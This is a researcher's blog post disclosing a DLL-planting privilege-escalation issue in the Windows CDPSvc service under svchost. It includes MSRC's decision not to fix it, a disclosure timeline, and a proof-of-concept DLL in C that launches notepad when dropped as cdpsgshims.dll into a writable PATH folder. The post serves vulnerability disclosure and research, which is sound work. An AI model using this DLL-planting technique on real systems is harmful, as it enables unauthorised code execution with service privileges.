---
layout: post
title:  "(MSRC Case 54347) Microsoft Windows Service Host (svchost) - Elevation of Privilege"
date:   2019-11-05 13:39:03 +0800
categories: [security, eop]
---

Description
-----------
svchost.exe (Service Host, or SvcHost) is a system process that can host from one to many Windows services in the Windows NT family of operating systems. Svchost is essential in the implementation of so-called shared service processes, where a number of services can share a process in order to reduce resource consumption (Wikipedia).

An elevation of privilege achievable via insecure library loading (PATH) on Windows Service Host Process (Svchost). Vulnerable version of CDPSvc.dll, 10.0.17763.771. Case was reported to MSRC on October 11, 2019. MSRC acknowledge and won't be fixing the issue as it did not meet their security bar. Here's the email update from MSRC:
```
Hi Nafiez,

From our investigation the issue only works if “C:\Perl64\bin” is in the PATH. These types of cases do not meet the bar because you need to be an admin to add locations to the PATH.

PATH DLL planting https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/

Based on that, no further action will be taken from MSRC and will proceed with closing out the case.

Regards,
```

Technical Analysis
------------------
Svchost load DLLs to run a service. In this case, we found out one of the services are prone to vulnerable with insecure library loading (PATH) that can elevate the privileges. The vulnerable service called “Connected Devices Platform Service (CDPSvc)”. In order to load the service, Svchost require to run a command:

```
C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc
```

We can use Process Explorer to view the DLL path it tries to load:
![Screenshot broadcast](https://raw.githubusercontent.com/nafiez/nafiez.github.io/master/static/img/_posts/exp_1.png "Screenshot broadcast")

The DLL “CDPSvc.dll” found to load non-existent DLL from PATH directory which in this case is “C:\Perl64\bin”.
![Screenshot broadcast](https://raw.githubusercontent.com/nafiez/nafiez.github.io/master/static/img/_posts/exp_2.png "Screenshot broadcast")

To verify if the DLL gets loaded, we can see function **LoadLibrary** trying to load cdpsgshims.dll with IDA Pro to see if it is really called by CDPSvc.dll.
![Screenshot broadcast](https://raw.githubusercontent.com/nafiez/nafiez.github.io/master/static/img/_posts/exp_3.png "Screenshot broadcast")

From the disassembly above, we know that CDPSvc.dll is trying to load **cdpsgshims.dll** which is we really don’t see it on our testing environment (Windows 10 x64). We decided to craft a simple proof-of-concept and put the DLL in the writable folder **C:\Perl64\bin**. We noticed Python folder also affected.
```
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		WinExec("notepad", 5);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) int InternetQueryOptionA() {
	WinExec("notepad", 5);
}
```

Successful exploitation will execute the notepad (our sample payload) and elevate the privilege to “NT AUTHORITY\LOCAL SERVICE”. We can observe the execution using ProcMon:
![Screenshot broadcast](https://raw.githubusercontent.com/nafiez/nafiez.github.io/master/static/img/_posts/exp_4.png "Screenshot broadcast")

Payload executed under svchost.exe with **NT AUTHORITY\LOCAL SERVICE** privilege
![Screenshot broadcast](https://raw.githubusercontent.com/nafiez/nafiez.github.io/master/static/img/_posts/exp_5.png "Screenshot broadcast")

**Disclosure timeline**
```
2019-10-11 - Reported to MSRC (via email)
2019-10-11 - Vendor acknowledge and will update accordingly.
2019-11-04 - Sent an email to vendor asking for update.
2019-11-05 - Vendor replied saying that this does not meet their security bar. No fix for this issue.
2019-11-05 - Writeup release.
```
